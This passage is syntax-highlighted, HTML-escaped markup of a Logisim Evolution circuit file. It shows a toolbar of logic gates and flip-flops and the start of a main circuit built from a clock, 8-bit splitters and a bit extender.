&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;OR Gate&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;XOR Gate&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;NAND Gate&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;NOR Gate&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;sep&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;4&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;D Flip-Flop&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;4&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Register&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;toolbar&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;circuit &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;main&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;appearance&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;logisim_evolution&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;circuit&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;main&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;clabelup&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;north&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;simulationFrequency&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8.0&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(140,300)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Clock&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;label&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;clk&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(350,220)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Splitter&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;fanout&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;incoming&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,460)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Splitter&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;facing&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;west&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;fanout&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;incoming&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;spacing&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(460,130)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Splitter&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;facing&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;west&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;fanout&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;incoming&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(670,190)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Bit Extender&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;out_width&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;7&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;one&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;comp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
